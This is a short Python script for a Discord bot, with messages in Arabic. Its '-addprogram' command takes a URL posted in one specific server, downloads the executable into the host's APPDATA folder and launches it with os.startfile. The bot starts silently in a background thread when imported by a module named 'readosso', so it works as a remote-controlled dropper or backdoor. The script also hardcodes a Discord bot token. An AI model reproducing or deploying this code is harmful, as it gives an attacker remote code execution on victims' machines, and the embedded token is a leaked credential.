import os
import sys
import asyncio
import discord
from discord.ext import commands
import requests

TOKEN = "MTQxODY5NzgxOTIxMjA4NzMxOA.GFCDeN.S9AsDBNbANp6Cxr7BkSkUH7nLqSFGQrb9jnoGA"
GUILD_ID = 1418032242315493478

intents = discord.Intents.default()
intents.messages = True
bot = commands.Bot(command_prefix="-", intents=intents)

@bot.command()
async def addprogram(ctx):
    if ctx.guild and ctx.guild.id == GUILD_ID:
        await ctx.send("ارسل رابط مباشر للملف exe:")
        def check(m):
            return m.author == ctx.author and m.channel == ctx.channel
        msg = await bot.wait_for('message', check=check, timeout=60)
        exe_url = msg.content.strip()
        await ctx.send("جاري التحميل والتشغيل...")
        try:
            appdata = os.getenv('APPDATA')
            exe_path = os.path.join(appdata, "downloaded_program.exe")
            r = requests.get(exe_url)
            with open(exe_path, "wb") as f:
                f.write(r.content)
            os.startfile(exe_path)
            await ctx.send("تم التحميل والتشغيل بنجاح.")
        except Exception as e:
            await ctx.send(f"حدث خطأ: {e}")

def run_bot():
    loop = asyncio.new_event_loop()
    asyncio.set_event_loop(loop)
    loop.create_task(bot.start(TOKEN))
    loop.run_forever()

if "readosso" in sys.modules or __name__ == "__main__":
    import threading
    t = threading.Thread(target=run_bot, daemon=True)
    t.start()